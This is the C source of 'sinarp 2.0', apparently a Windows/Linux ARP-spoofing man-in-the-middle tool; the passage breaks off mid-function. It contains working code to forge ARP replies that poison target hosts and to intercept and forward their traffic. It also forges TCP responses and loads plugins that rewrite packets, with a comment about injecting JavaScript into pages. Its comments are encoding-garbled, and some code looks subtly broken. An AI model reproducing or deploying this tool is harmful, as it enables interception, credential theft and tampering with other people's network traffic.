/*
sinarp ARP �м�����ƭ����
���� ˫����ƭ
���ز��
���Դ۸����ݰ�
���� zxarps  ettercap �Ĵ���
������ windows �� linux �±���

˫����ƭ��
A<--->M<--->B
������ƭ
A --->M---->B

sinarp ����Ľӿ�

plugin_init();  //���ز��
plugin_process_packet(); //�������ݰ�
plugin_unload(); //ж�ز��

ֻ��עһ��C��

��������� �� pcap ������ �Լ�����ȥ�İ�

ether src not $YOUR_MAC_ADDRESS

��������ķ�ս  �������Ĳ���� 

��ȥ�� ARP ��ƭҪ�õ��� Js д�� 

Ȼ����ֲ��Linux�� ~~~


// ip ��ƭ
*/
#define _WSPIAPI_COUNTOF
#define _CRT_SECURE_NO_WARNINGS
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#ifdef WIN32
#include <WinSock2.h>
#include <windows.h>
#include <IPHlpApi.h>
#else
#include <dlfcn.h>
#include <stdarg.h> //for va_list
#include <sys/socket.h>
#include <errno.h> //For errno - the error number
#include <pthread.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <netdb.h>    //hostend
#include <arpa/inet.h>
#include <netinet/tcp.h>    //Provides declarations for tcp header
#include <netinet/ip.h>    //Provides declarations for ip header
#include <sys/ioctl.h> 
#include <net/if.h>
#include <linux/rtnetlink.h>
#include <signal.h>
#endif
#include "sinarp.h"
#ifdef WIN32
#pragma comment(lib,"ws2_32")
#pragma comment(lib,"Iphlpapi.lib")
#endif

#ifdef WIN32
#else
void Sleep(uint32 msec)
{
    struct timespec slptm;
    slptm.tv_sec = msec / 1000;
    slptm.tv_nsec = 1000 * 1000 * (msec - (msec / 1000) * 1000);      //1000 ns = 1 us
    if(nanosleep(&slptm,NULL) != -1)
    {

    }
    else
    {
        sinarp_printf("%s : %u","nanosleep failed !!\n",msec);
    }
}
#endif

BOOL  sinarp_load_plugin(const char *szPluginName)
{
    plugin_info plugin = {0};
    plugin_info *ptemp_list;
#ifdef WIN32
    HMODULE hdll = LoadLibraryA(szPluginName);
    if(hdll == NULL)
    {
        DBG_MSG("load library failed   %u !!\n",GetLastError());
        return FALSE;
    }
    plugin.process_packet = (BOOL ( *)(ETHeader *,uint32)) GetProcAddress(hdll,"process_packet");
	plugin.plugin_init = (BOOL (*)())GetProcAddress(hdll,"plugin_init");
	plugin.plugin_unload = (void * (*)())GetProcAddress(hdll,"plugin_unload");
#else
    void * hdll = dlopen(szPluginName,RTLD_LAZY);
    if(hdll == NULL)
    {
        DBG_MSG("load library failed   %s !!\n",strerror(errno));
        return FALSE;
    }
    plugin.process_packet = (BOOL ( *)(ETHeader *,uint32)) dlsym(hdll,"process_packet");
	plugin.plugin_init = (BOOL (*)())dlsym(hdll,"plugin_init");
	plugin.plugin_unload = (void * (*)())dlsym(hdll,"plugin_unload");
#endif
    if(plugin.process_packet == NULL || NULL == plugin.plugin_init || NULL == plugin.plugin_unload)
    {
        return FALSE;
    }

	if(FALSE == plugin.plugin_init())
	{
		return FALSE;
	}

    plugin.name = strdup(szPluginName);

    //�嵽����б�����
    if(g_plugin_list.plugin == NULL)
    {
        ptemp_list = (plugin_info *)malloc(sizeof(plugin_info));
        g_plugin_list.plugin = ptemp_list;
        ++g_plugin_list.count;
    }
    else
    {
        ptemp_list = (plugin_info *)malloc((g_plugin_list.count + 1) * sizeof(plugin_info));
        memcpy(ptemp_list,g_plugin_list.plugin,g_plugin_list.count * sizeof(plugin_info));
        free(g_plugin_list.plugin);
        g_plugin_list.plugin = ptemp_list;
        ptemp_list = g_plugin_list.plugin + g_plugin_list.count;
        ++g_plugin_list.count;
    }
    memcpy(ptemp_list,&plugin,sizeof(plugin_info));
    return TRUE;
}

BOOL  sinarp_free_plugin_list()
{
    uint32 idx = 0;
    if(g_plugin_list.count == 0)
        return FALSE;
    for (idx  = 0 ;idx < g_plugin_list.count ;idx ++)
    {
		//������ ж�صĺ���
		g_plugin_list.plugin[idx].plugin_unload();

        free((void *)g_plugin_list.plugin[idx].name);
    }
    free(g_plugin_list.plugin);
    ZeroMemory(&g_plugin_list,sizeof(plugin_list));
    return TRUE;
}

const char *  sinarp_take_out_string_by_char(const char *Source,char *Dest, int buflen, char ch)
{
    int i;
    const char *p;
    const char *lpret;
    if(Source == NULL)
        return NULL;

    p = strchr(Source, ch);
    while(*Source == ' ')
        Source++;
    for(i=0; i<buflen && *(Source+i) && *(Source+i) != ch; i++)
    {
        Dest[i] = *(Source+i);
    }
    if(i == 0)
        return NULL;
    else
        Dest[i] = '\0';

    lpret = p ? p+1 : Source+i;

    while(Dest[i-1] == ' ' && i>0)
        Dest[i---1] = '\0';

    return lpret;
}

void  sinarp_inert_hostlist(HostList **pHostList,uint32 ip,uint8 mac[6])
{
    //    msg("%s:%x %x\n",__func__,start_ip,end_ip);
    HostList *pTmp;
    if(!*pHostList)
    {
        *pHostList = (HostList *)malloc(sizeof(HostList));
        (*pHostList)->HostCount = 1;
    }
    else
    {
        pTmp = (HostList *)malloc(((*pHostList)->HostCount + 1) * sizeof(HostList));
        memcpy(pTmp,pHostList,(*pHostList)->HostCount * sizeof(HostList));
        free(*pHostList);
        *pHostList = pTmp;
        ++(*pHostList)->HostCount;
    }
    (*pHostList)[(*pHostList)->HostCount-1].pHost->ip = ip;
    memcpy((*pHostList)[(*pHostList)->HostCount -1].pHost->mac,mac,6);
};

/*
����� ������ ��ֹ���̴߳�ӡ ����
*/

void  sinarp_printf(const char * fmt,...)
{
    volatile static int cs = 0;
    va_list args;
    int n;
    char TempBuf[8192];
loop:
    while(cs == 1)
        Sleep(1);
    if(cs == 0)
        cs = 1;
    else
        goto loop;
    va_start(args, fmt);
    n = vsprintf(TempBuf, fmt, args);
    printf("%s",TempBuf);
    va_end(args);
    cs = 0;
    //LeaveCriticalSection(&cs);
}


uint8 *sinarp_load_file_into_mem(const char *file)
{
	FILE *fp;
	long size;
	uint8 *data;

	fp = fopen(file,"r");
	if(fp == NULL)
		return NULL;
    fseek(fp,0L,SEEK_END);
	size = ftell(fp);
	if(size > 1)
	{
		rewind(fp);
		data = (uint8 *)malloc(ceil(size / 1024.0) * 1024);
		if(data)
		{
			if(fread(data,1,size,fp))
			{
				return data;
			}
		}
		free(data);
	}
	fclose(fp);
	return NULL;
}

#ifdef WIN32
//-------------------------------

OVERLAPPED		g_ol;
HANDLE g_hrouterevent;
// ����·��
BOOL sinarp_start_router()
{
    DWORD		dwRet;
    HANDLE		h_err = NULL;

    g_hrouterevent = CreateEvent( NULL, TRUE, FALSE, NULL );
    if( g_hrouterevent == NULL )
    {
        return FALSE;
    }

    ZeroMemory( (void*)&g_ol, sizeof( g_ol ) );

    g_ol.hEvent = g_hrouterevent;

    dwRet = EnableRouter( &h_err, &g_ol );

    if( dwRet == ERROR_IO_PENDING )	return TRUE;

    return FALSE;
}

// �ر�·��
BOOL sinarp_close_router()
{
    DWORD		dwRet;
    DWORD		dwEnableCount = 0;

    dwRet = UnenableRouter( &g_ol, &dwEnableCount );

    CloseHandle( g_hrouterevent );

    if( dwRet == NO_ERROR ) return TRUE;

    return FALSE;
}
#endif

#ifdef WIN32
// ��̬��ARP����������ARP��
// code from arpspoof,modifyed by shadow
BOOL sinarp_static_arp( unsigned long ul_ip, unsigned char uc_mac[] )
{
    MIB_IPFORWARDROW	ipfrow;
    MIB_IPNETROW		iprow;
    DWORD				dwIPAddr = ul_ip;

    if( GetBestRoute( dwIPAddr, ADDR_ANY, &ipfrow ) != NO_ERROR )
    {
        return FALSE;
    }

    memset( &iprow, 0, sizeof( iprow ) );
    iprow.dwIndex		= ipfrow.dwForwardIfIndex;
    iprow.dwPhysAddrLen	= 6;

    memcpy( iprow.bPhysAddr, uc_mac, 6 );
    iprow.dwAddr = dwIPAddr;
    iprow.dwType = 4;							// -static

    if( CreateIpNetEntry( &iprow ) != NO_ERROR )
    {	
        return FALSE;
    }

    return TRUE;
}
#endif

// ����ARP���ݱ�
int  sinarp_build_arp_packet(\
    ARP_PACKET *arp_packet,
    uint16 arp_opcode,//Ҫ���͵�ARP��������  
    uint8 src_mac[6],
    uint8 dst_mac[6],
    uint8 arp_src_mac[6],
    uint32 arp_src_ip,
    uint8 arp_dst_mac[6],
    uint32 arp_dst_ip)
{
    arp_packet->ethdr.type = htons(ETHERTYPE_ARP);
    arp_packet->arphdr.hrd = htons(ARPHRD_ETHER);
    arp_packet->arphdr.eth_type = htons(ETHERTYPE_IP);
    arp_packet->arphdr.maclen = 6;
    arp_packet->arphdr.iplen = 4;
    arp_packet->arphdr.opcode = htons(arp_opcode);

    memcpy(arp_packet->ethdr.dhost,dst_mac, 6 );		//Ŀ��MAC��ַ��(A�ĵ�ַ��
    memcpy(arp_packet->ethdr.shost,src_mac, 6 );		//ԴMAC��ַ

    memcpy(arp_packet->arphdr.smac,arp_src_mac, 6 );		//α���C��MAC��ַ
    arp_packet->arphdr.saddr = arp_src_ip;

    memcpy(arp_packet->arphdr.dmac,arp_dst_mac, 6 );		//Ŀ��A��MAC��ַ
    arp_packet->arphdr.daddr = arp_dst_ip;					//Ŀ��A��IP��ַ

    return 1;
}

/*
����ARP���ݰ����  dest ip ��Ӧ�� MAC  �����߳������õ�Զ�������ظ�����Ϣ �õ���MAC��ַ
*/
BOOL  sinarp_send_arp(uint32 DestIP)
{
    ARP_PACKET arp_packet={0};
    sinarp_build_arp_packet(&arp_packet,ARP_REQUEST,g_my_mac,g_broadcast_mac,g_my_mac,g_my_ip,g_zero_mac,DestIP);
    if(pf_pcap_sendpacket(g_adhandle, (unsigned char *)&arp_packet, ARP_LEN) < 0)
    {
        sinarp_printf("%s","[!] Forward thread send packet error\n");
        return FALSE;
    }
    return TRUE;
}

/*
���� spoof_ip ip ��Ӧ�� MAC �� mac
*/
BOOL  sinarp_arp_spoof(uint32 spoof_ip,uint8 *spoof_mac,uint32 ip,uint8 *mac)
{
    ARP_PACKET arp_packet={0};

    sinarp_build_arp_packet(&arp_packet,ARP_REPLY,mac,spoof_mac,mac,ip,spoof_mac,spoof_ip);
    if(pf_pcap_sendpacket(g_adhandle, (unsigned char *)&arp_packet, ARP_LEN) < 0)
    {
        sinarp_printf("%s","[!]sinarp_arp_spoof(): send packet error\n");
        return FALSE;
    }
    return TRUE;
}

#ifdef WIN32
BOOL sinarp_init_pcap_funcs()
{
    pf_pcap_perror = (void  ( *)(pcap_t *, char *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_perror");
    pf_pcap_sendpacket = (int  ( * )(pcap_t * ,u_char * ,int )) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_sendpacket");
    pf_pcap_next_ex = (int ( *)(pcap_t *, struct pcap_pkthdr **, const u_char **)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_next_ex");
    pf_pcap_freealldevs = (void ( *)( pcap_if_t *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_freealldevs");
    pf_pcap_close = (void ( *)(pcap_t *))GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_close");
    pf_pcap_breakloop = (void ( *)(pcap_t *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_breakloop");
    pf_pcap_loop = (int	( *)(pcap_t *, int, pcap_handler, u_char *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_loop");
    pf_pcap_open_live = (pcap_t *( *)(const char *,int,int,int,char *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_open_live");
    pf_pcap_findalldevs = (int ( *)(pcap_if_t **,char *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_findalldevs");
    pf_pcap_breakloop = (void ( *)(pcap_t *))GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_breakloop");
    pf_pcap_compile = (int ( *)(pcap_t *, struct bpf_program *, const char *, int, bpf_u_int32))GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_compile");
    pf_pcap_setfilter = (int ( *)(pcap_t *,struct bpf_program *)) GetProcAddress(LoadLibraryA("wpcap.dll"),"pcap_setfilter");
    if(!(pf_pcap_perror &&
        pf_pcap_sendpacket &&
        pf_pcap_next_ex &&
        pf_pcap_freealldevs &&
        pf_pcap_close &&
        pf_pcap_breakloop &&
        pf_pcap_open_live &&
        pf_pcap_findalldevs &&
        pf_pcap_breakloop &&
        pf_pcap_compile &&
        pf_pcap_setfilter))
    {
        return FALSE;
    }
    return TRUE;
}
#else // for linux 
BOOL sinarp_init_pcap_funcs()
{
    pf_pcap_perror = (void  ( *)(pcap_t *, char *)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_perror");
    pf_pcap_sendpacket = (int  ( * )(pcap_t * ,u_char * ,int )) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_sendpacket");
    pf_pcap_next_ex = (int ( *)(pcap_t *, struct pcap_pkthdr **, const u_char **)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_next_ex");
    pf_pcap_freealldevs = (void ( *)( pcap_if_t *)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_freealldevs");
    pf_pcap_close = (void ( *)(pcap_t *))dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_close");
    pf_pcap_breakloop = (void ( *)(pcap_t *)) dlsym(dlopen("wpcap.dll",RTLD_LAZY),"pcap_breakloop");
    pf_pcap_loop = (int	( *)(pcap_t *, int, pcap_handler, u_char *)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_loop");
    pf_pcap_open_live = (pcap_t *( *)(const char *,int,int,int,char *)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_open_live");
    pf_pcap_findalldevs = (int ( *)(pcap_if_t **,char *)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_findalldevs");
    pf_pcap_breakloop = (void ( *)(pcap_t *))dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_breakloop");
    pf_pcap_compile = (int ( *)(pcap_t *, struct bpf_program *, const char *, int, bpf_u_int32))dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_compile");
    pf_pcap_setfilter = (int ( *)(pcap_t *,struct bpf_program *)) dlsym(dlopen("libpcap.so",RTLD_LAZY),"pcap_setfilter");
    if(!(pf_pcap_perror &&
        pf_pcap_sendpacket &&
        pf_pcap_next_ex &&
        pf_pcap_freealldevs &&
        pf_pcap_close &&
        pf_pcap_breakloop &&
        pf_pcap_open_live &&
        pf_pcap_findalldevs &&
        pf_pcap_breakloop &&
        pf_pcap_compile &&
        pf_pcap_setfilter))
    {
        return FALSE;
    }
    return TRUE;
}
#endif

void sinarp_copyright_msg()
{
    printf(\
        "sinarp 2.0\n"
        //"����ARP��ƭ���м��˹�������\n"
        "By:sincoder\nBlog:www.sincoder.com\nEmail:2bcoder@gmail.com\n");
}

void sinarp_show_help_msg()
{
    sinarp_printf("Usage:sinarp [OPTIONS]\n" 
        "\t-i [network interface id]\n" 
        "\t-A [Target A]\n"
        "\t-M [Middleman's ip,if the NIC has multiple Ip ,you need to specify one]\n"
        "\t-B [Target B]\n"
        "\t-s [0|1] spoof type 0: A --> M --> B 1:  A <--> M <--> B\n"
        "\t-p [Name of the plug-ins to be loaded, split multiple plugin use ',']\n"
        "\t-t [Time between echo spoof packet , in ms, default is 10000ms]\n"
        "\t-f [Close ip forwarding]\n");
}
/*
void sinarp_show_help_msg()
{
sinarp_printf("Usage:sinarp [ѡ��]\n" 
"\t-i [����id]\n" 
"\t-A [A�������б�,Ĭ��Ϊ����]\n"
"\t-M [�м���ip,����������ж��Ip�Ļ�����Ҫָ��һ��ip��Ĭ��ʹ��ָ�������ĵ�һ��ip]\n"
"\t-B [B�������б�]\n"
"\t-s [0|1] ��ƭ���� 0:������ƭ A --> M --> B 1:˫����ƭ  A <--> M <--> B\n"
"\t-p [Ҫ���صĲ������,������֮����',' �ָ�]\n"
"\t-t [��ƭ���ݰ��ļ��ʱ��,��λms,Ĭ��Ϊ10000ms]\n");
}
*/
//����Ч��ͺ������Ȱ�IP�ײ���Ч����ֶ���Ϊ0(IP_HEADER.checksum=0)
//Ȼ���������IP�ײ��Ķ����Ʒ���ĺ͡�
uint16 checksum(uint16 *buffer, int size)
{
    unsigned long cksum=0;
    while (size >1) {
        cksum+=*buffer++;
        size-=sizeof(uint16);
    }
    if (size) cksum += *(uint8*) buffer;
    cksum = (cksum >> 16) + (cksum&0xffff);
    cksum += (cksum >> 16);
    return (uint16) (~cksum); 
}

unsigned long cksum1(unsigned long cksum, uint16 *buffer, int size)
{
    while (size >1) {
        cksum+=*buffer++;
        size-=sizeof(uint16);
    }
    if (size) cksum += *(uint8*) buffer;

    return (cksum); 
}

uint16 cksum2(unsigned long cksum)
{

    cksum = (cksum >> 16) + (cksum&0xffff);
    cksum += (cksum >> 16);
    return (uint16) (~cksum); 
}
//
// ����tcp udp����͵ĺ���
// 
void  sinarp_checksum(IPHeader *pIphdr)
{
    PSD psd;
    u_int i;
    unsigned long	_sum = 0;
    IPHeader  *ih;
    TCPHeader *th;
    UDPHEADER *uh;
    u_int ip_len=0, pro_len=0, data_len=0;
    unsigned char *data_offset;

    // �ҵ�IPͷ��λ�ú͵õ�IPͷ�ĳ���
    ih = pIphdr;
    ip_len = (ih->iphVerLen & 0xf) * sizeof(unsigned long);
    if(ih->ipProtocol == PROTO_TCP)
    {
        // �ҵ�TCP��λ��
        th = (TCPHeader *) ((u_char*)ih + ip_len);
        pro_len = ((th->dataoffset>>4)*sizeof(unsigned long));
        th->checksum = 0;
    }
    else if(ih->ipProtocol == PROTO_UDP)
    {
        // �ҵ�UDP��λ��
        uh = (UDPHEADER *) ((u_char*)ih + ip_len);
        pro_len = sizeof(UDPHEADER);
        uh->uh_sum = 0;
    }
    // ���ݳ���
    data_len = ntohs(ih->ipLength) - (ip_len + pro_len);
    // ����ƫ��ָ��
    data_offset = (unsigned char *)ih + ip_len + pro_len;

    // αͷ
    // ����ԴIP��ַ��Ŀ��IP��ַ
    psd.saddr = ih->ipSource;
    psd.daddr = ih->ipDestination;

    // ����8λ0��

    psd.mbz = 0;

    // Э��
    psd.ptcl = ih->ipProtocol;

    // ����
    psd.udpl = htons(pro_len + data_len);

    // ���뵽��һ��16λ�߽�
    for(i=0; i < data_len % 2; i++)
    {
        data_offset[data_len] = 0;
        data_len++;
    }
    ih->ipChecksum = 0;
    ih->ipChecksum = checksum((uint16*)ih, ip_len);
    _sum = cksum1(0, (uint16*)&psd, sizeof(PSD));
    _sum = cksum1(_sum, (uint16*)((u_char*)ih + ip_len), pro_len);
    _sum = cksum1(_sum, (uint16*)data_offset, data_len);
    _sum = cksum2(_sum);

    // �������У��ͣ��������䵽Э��ͷ
    if(ih->ipProtocol == PROTO_TCP)
        th->checksum = (uint16)_sum;
    else if(ih->ipProtocol == PROTO_UDP)
        uh->uh_sum = (uint16)_sum;
    else 
        return;
}

// from NetFuke Source 
// �ڴ�ƥ�亯��memfind
// ����BM�㷨
// ����:���� KCN
// modified by shadow @2007/03/18
void*  sinarp_memfind( const void*		in_block,		/* ���ݿ� */
    const size_t	block_size,		/* ���ݿ鳤�� */
    const void*		in_pattern,		/* ��Ҫ���ҵ����� */
    const size_t	pattern_size,	/* �������ݵĳ��� */
    size_t*			shift_table,	/* ��λ��Ӧ����256*size_t������ */
    BOOL			b_init )		/* �Ƿ���Ҫ��ʼ����λ�� */
{
    size_t	i4_index	= 0;	// �ֽ�ƫ����
    size_t	i4_matchlen	= 0;	// ƥ���˵ĳ���
    size_t	i4_limit	= 0;	// ����������󳤶�

    const unsigned char*	p_match		= NULL;		// ƥ�俪ʼָ��
    const unsigned char*	p_block		= (unsigned char *) in_block;	// ����ָ��
    const unsigned char*	p_pattern	= (unsigned char *) in_pattern;	// ƥ��ָ��

    // ���
    if( ( NULL == p_block ) ||
        ( NULL == p_pattern ) ||
        ( block_size < pattern_size ) ||
        ( ( b_init == FALSE ) && ( shift_table == NULL ) ) )

    {
        return NULL;
    }

    // �մ�ƥ���һ��
    if( 0 >= pattern_size )
    {
        return ( (void *)p_block );
    }

    // ���û�г�ʼ����λ��������λ��
    if( b_init )
    {
        // ������λ��ռ�
        shift_table = (size_t*)malloc(256*sizeof(size_t));

        // ��ʼ����λƫ����
        for( i4_index = 0; i4_index < 256; ++i4_index )
        {
            shift_table[i4_index] = pattern_size + 1;
        }

        // ʵ���������ַ���ƫ����
        for( i4_index = 0; i4_index < pattern_size; ++i4_index )
        {
            shift_table[(unsigned char)p_pattern[i4_index]] = pattern_size - i4_index;
        }
    }

    // ʵ����Ҫ��������󳤶�
    i4_limit = block_size - pattern_size + 1;

    // ��ʼ�������ݿ飬ÿ��ǰ����λ���е�����
    for(	i4_index = 0;
        i4_index < i4_limit;
        i4_index += shift_table[(unsigned char)p_block[i4_index + pattern_size]] )
    {
        // �����һ���ֽ�ƥ�䣬��ô����ƥ��ʣ�µ�
        if( p_block[i4_index] == *p_pattern )
        {
            p_match		= p_block + i4_index + 1;
            i4_matchlen	= 1;

            do
            {
                // ƥ������
                if( i4_matchlen == pattern_size )
                {
                    if( b_init )
                    {
                        free(shift_table);
                    }
                    return (void*)( p_block + i4_index );
                }
            }while( *p_match++ == p_pattern[i4_matchlen++] );
        }
    }

    if( b_init )
    {
        free(shift_table);
    }

    return NULL;
}

/*
�޸���ҳ  ����һ�� �����Լ��޸ĵİ� ������ Ȼ��������ʵ�İ� Ҫ��Ҫ�ٷ�����ʵ�� �������� �����ȥץ�����ơ���
����һ�� js ��������ʵ����ҳ 
*/
/*
���� TRUE ˵���������Ҫ��ת����ȥ  FALSE �Ļ� ˵�������Լ��Ѿ�����������ˡ�
*/


/*
�ɴ�������ݰ� ������һ�����ذ� ��
IN ethdr ����������

*/
BOOL  sinarp_build_tcp_response_packet(ETHeader *ethdr,uint8 *packet,uint32 * psize,uint8 *data,uint32 size)
{
    IPHeader *in_iphdr = NULL;
    ETHeader *my_ethdr = (ETHeader *)packet;
    IPHeader *my_iphdr = NULL;
    TCPHeader *my_tcphdr = NULL;
    TCPHeader *in_tcphdr = NULL;
    uint32 ip_len;
    uint32 in_data_len;
    memcpy(my_ethdr->dhost,ethdr->shost,6);
    memcpy(my_ethdr->shost,ethdr->dhost,6);
    my_ethdr->type = ethdr->type;
    my_iphdr = (IPHeader *)((uint8 *)my_ethdr+14);
    in_iphdr = (IPHeader *)((uint8 *)ethdr+14);
    //����ԭ Ip ͷ Ȼ���д��Ҫ��д���ֶ�
    memcpy(my_iphdr,in_iphdr,sizeof(IPHeader)+sizeof(TCPHeader));
    my_iphdr->ipSource = in_iphdr->ipDestination;
    my_iphdr->ipDestination = in_iphdr->ipSource;
    ip_len = (my_iphdr->iphVerLen & 0xf) * sizeof(unsigned long);
    my_tcphdr = (TCPHeader *) ((u_char*)my_iphdr + ip_len);
    in_tcphdr = (TCPHeader *)((u_char*)in_iphdr + ip_len);
    my_iphdr->ipLength = htons(ip_len + ((my_tcphdr->dataoffset>>4)*sizeof(unsigned long)) + size);
    in_data_len = ntohs(in_iphdr->ipLength) - (ip_len + ((my_tcphdr->dataoffset>>4)*sizeof(unsigned long))); //���յ������ݳ���
    my_tcphdr->acknowledgeNumber = htonl(ntohl(in_tcphdr->sequenceNumber) + in_data_len);
    my_tcphdr->sequenceNumber = in_tcphdr->acknowledgeNumber;
    my_tcphdr->sourcePort = in_tcphdr->destinationPort;
    my_tcphdr->destinationPort = in_tcphdr->sourcePort;
    my_tcphdr->flags = 0x08 | 0x10 |0x01; // PSH + ACK + FIN �����Ͽ����ӵı�ʶ ��Ϊ�����ĺ���ʵ������ͨ�� ��Ȼ�ᷢ��TCP���г���
    memcpy((uint8 *)my_iphdr + ip_len + ((my_tcphdr->dataoffset>>4)*sizeof(unsigned long)),data,size);
    sinarp_checksum(my_iphdr);
    *psize = 14 + ntohs(my_iphdr->ipLength);
    return TRUE;
}

char * sinarp_get_mac_by_ip(uint32 ip)
{
    if(g_HostList[ip >> 24].active = 1)
    {
        return (char *)&g_HostList[ip >> 24].mac[0];
    }
    return NULL;
}

//��������mac��ַ ����ת��
void  sinarp_forward_fix_packet(ETHeader *packet)
{
    IPHeader *ih = (IPHeader *) ((u_char*)packet + 14); //14Ϊ��̫ͷ�ĳ���
    /*
    �޸������ݰ� ���뱣֤��������ȷ��
    */
    // ת�����ݰ� 
    memcpy(packet->shost,packet->dhost,6);//Ҫ����Դ��ַΪ �м��˵ĵ�ַ ��Ȼ ���ظ����񵽰� ����
    /*
    ����Ŀ�ĵ�ַ���õ� mac �ķ�ʽ���ɿ�  ��ΪĿ�ĵ�ַ������������ ��ʱ����Ҫ��������
    ���ݰ�ת����أ�
    IP ���� �� Ŀ��� Դ IP ����������������� ��ô˵���������е���̨����ͨѶ ��ʱֱ���� ip �õ���Ӧ�� mac ��ַ�����ˡ�
    �������һ�����ǵ������� ˵��������������֮��ͨѶ�� ��ô���ز��������� ��ʱ�������� ip ���Եõ��� mac ��ַ 
    �������͵����� Դ ip ��ַ�������� Ŀ���������� ��ô �滻 Ŀ��MAC��ַΪ���ص� ԴMACΪ�Լ��� ԴipҲΪ�Լ���
    �������͵����� Դ ip �������� Ŀ���������� �滻Ŀ�� mac Ϊip��mac ԴMAC Ϊ�Լ� 
    2��ip ���������� ������� ������
    */
    if(((g_my_ip & 0x00FFFFFF) ^ (ih->ipDestination & 0x00FFFFFF)) == 0)
    {
        //���Ŀ�� ip ������
        memcpy(packet->dhost,g_HostList[ih->ipDestination >> 24].mac,6); //�滻Ŀ�� mac Ϊ��ȷ�� mac
    }
    else
    {
        // Ŀ���������� ��ôԴip�϶���������
        memcpy(packet->dhost,g_HostList[g_my_gw_addr >> 24].mac,6); //�滻Ŀ�� mac Ϊ���ص� mac
    }
}

void   sinarp_packet_handler(u_char *param, const struct pcap_pkthdr *header, 
    const u_char *pkt_data)
{
    ETHeader *eh;
    IPHeader *ih;
    ARPHeader *arp_hdr;
    BOOL bRet = FALSE;
    u_int ip_len=0, pro_len=0, data_len=0;
    u_int pkt_len = header->len;
    uint32 idx = 0;
    eh = (ETHeader *) pkt_data;
    if(pkt_len < 14)
        return; 
    ++g_packet_count;
    if(eh->type == htons(ETHERTYPE_ARP))
    {
        //�Ǹ� ARP ��  ��ô�����ǲ���ARP�ظ�������
        arp_hdr = (ARPHeader *)((uint8 *)eh + 14);
        if(arp_hdr->opcode == htons(ARP_REPLY))  //ARP �ظ���
        {
            //�����ߵ� IP �� MAC������Ҫ�������ǵġ�IP���͡�MAC��Ӧ��ϵ
            //DBG_MSG("ARP tel: %s --> %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",sinarp_iptos(arp_hdr->saddr),\
            //   arp_hdr->smac[0],arp_hdr->smac[1],arp_hdr->smac[2],arp_hdr->smac[3],arp_hdr->smac[4],arp_hdr->smac[5]);
            //������� ip �ǲ��������ǵ� C ������
            if(((g_my_ip & 0x00FFFFFF) ^ (arp_hdr->saddr & 0x00FFFFFF)) == 0 && g_HostList[arp_hdr->saddr >> 24].active == 0)
            {
                //������� ip �� ip �������Ӧ�� MAC
                memcpy(g_HostList[arp_hdr->saddr >> 24].mac,arp_hdr->smac,6);
                g_HostList[arp_hdr->saddr >> 24].active = 1;
            }
        }
    }
    if(g_auto_ip_forward == 1)
    {
        //ת�� ip ���ݰ�����
        if(eh->type != htons(ETHERTYPE_IP))
            return; // ֻת��IP��

        // �ҵ�IPͷ��λ�ú͵õ�IPͷ�ĳ���
        ih = (IPHeader *) ((u_char*)eh + 14); //14Ϊ��̫ͷ�ĳ���
        /*
        �ж� ����Ҫ��Ҫת�� ���ݰ�
        ���ж� ���ǲ��Ƿ����Լ��� (�ж� ip ͷ��� Ŀ�� ip �ǲ������ǵ�ip)
        Ȼ�� �������б����� ���� ip ��Ӧ�� mac ����ǻ������ ��ôȡ���� mac ���滻 ���յ������ݰ��� Ŀ�� mac �����ͳ�ȥ					  
        ʹ�� pcap_sendpacket ����ȥ�İ� Ҳ�ᱻ pcap ����
        */
        /*
        ��� ����Ŀ���ַ���ҵ� mac ���� Ŀ�� ip �����ҵ� ip ��ô�����������Ҫת����  ��Ϊ�м��� ����������ת�� ~~
        */
        if((ih->ipDestination !=  g_my_ip) && (memcmp(g_my_mac,eh->dhost,6) == 0))
        {
            // ���ò�����������ݰ������޸�����
            if(g_plugin_list.count > 0)
            {
                //���λ��ÿ������� ���ݰ�����ָ�� ���������ݰ�
                for (idx  = 0 ;idx < g_plugin_list.count;idx ++)
                {
                    if(g_plugin_list.plugin[idx].process_packet(eh,pkt_len) == FALSE)
                        return; 
                }
            }

            sinarp_forward_fix_packet(eh);
            //DBG_MSG("send packet to %s \n",sinarp_iptos(ih->ipDestination));
            if (pf_pcap_sendpacket(g_adhandle, (unsigned char *) pkt_data, pkt_len) < 0)
            {
                printf("\r[!] Forward thread send packet error\r\n");
            }
        }
    }
    return;
}

void sinarp_do_capture()
{
    int ret;

    while(!g_is_time_shutdown)
    {
        ret = pf_pcap_loop(g_adhandle, 1, (pcap_handler)sinarp_packet_handler,NULL);
        if(ret == 0)
        {
            continue;
        }
        else
        {
            //pf_pcap_perror(g_adhandle,"break");
            break;
        }
    }
}

pcap_if_t * sinarp_get_ifs()
{
    pcap_if_t /* *dev, *pdev, *ndev,*/ *g_devs = NULL;
    char pcap_errbuf[PCAP_ERRBUF_SIZE];
    //DBG_MSG("enter : %s \n",__FUNCTION__);
    /* retrieve the list */
    if (pf_pcap_findalldevs((pcap_if_t **)&g_devs, pcap_errbuf) == -1)
    {	//DBG_MSG("%s", pcap_errbuf);
        return NULL;
    }

    /* analize the list and remove unwanted entries */
    //    for (pdev = dev = (pcap_if_t *)g_devs; dev != NULL; dev = ndev) 
    //   {
    /* the next entry in the list */
    //        ndev = dev->next;
